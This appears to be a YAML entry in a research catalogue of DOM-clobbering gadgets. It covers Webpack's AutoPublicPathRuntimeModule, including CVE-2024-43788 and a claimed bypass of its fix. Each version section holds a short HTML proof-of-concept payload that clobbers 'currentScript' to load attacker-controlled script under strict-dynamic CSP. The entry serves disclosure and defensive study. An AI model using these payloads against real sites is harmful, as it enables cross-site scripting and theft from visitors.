---
description: |
    Webpack is a module bundler. Its main purpose is to bundle JavaScript files for usage in a browser, yet it is also capable of transforming, bundling, or packaging just about any resource or asset.
github: webpack/webpack
gadgets:
  Latest:
    authors:
      - twitter:kevin_mizu
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - script-tag
      - name-attr
      - src-attr
      - strict-dynamic-csp
      - unsafe-eval-csp
      - before-lib-load
    pocs:
      - description: It is possible to take part of the fix for [CVE-2024-43788](#<5.93.0) which uses the `src=` of the last `<script>` tag of the page to load additionnal modules. As with the CVE, it is mandatory to have the _AutoPublicPathRuntimeModule_ enabled.<br><br>*For this to work, the user input must be placed above the bundle script tag. We then use a trick use table HTML mutation to make it follow down the DOM tree. This ensures that when Webpack loads, our script is already in the DOM and positioned below it, something that normally shouldn't be possible, since the page stops loading while a script is being executed.*
        code: |
          <!-- user input -->
          <img name="currentScript"><table>
          <script src="[current-location]/assets/xss/index.js"></script>

          <div>
          <script nonce="secret" src="/assets/libs/webpack/bundle.js"></script>
          </div>
    links:
      - https://mizu.re/post/heroctf-v6-writeups#underConstruction-gadget-webpack-domclobbering

  ≤5.92.1:
    cve: CVE-2024-43788
    authors:
      - github:jackfromeast
      - github:ishmeals
    tags:
      - chrome-browser
      - safari-browser
      - img-tag
      - script-tag
      - name-attr
      - src-attr
      - unsafe-eval-csp
      - strict-dynamic-csp
      - before-lib-load
    pocs:
      - description: It is mandatory to have the _AutoPublicPathRuntimeModule_ enabled.
        code: |
          <!-- user input -->
          <img name="currentScript" src="[current-location]/assets/xss/index.js">

          <script nonce="secret" src="/assets/libs/webpack/5.92.1/bundle.js"></script>
    links:
      - https://github.com/webpack/webpack/security/advisories/GHSA-4vvj-4cpr-p986
      - https://github.com/jackfromeast/dom-clobbering-collection/blob/main/domc-gadgets/webpack.md
      - https://jackfromeast.github.io/assets/DOMinoEffect.pdf
---
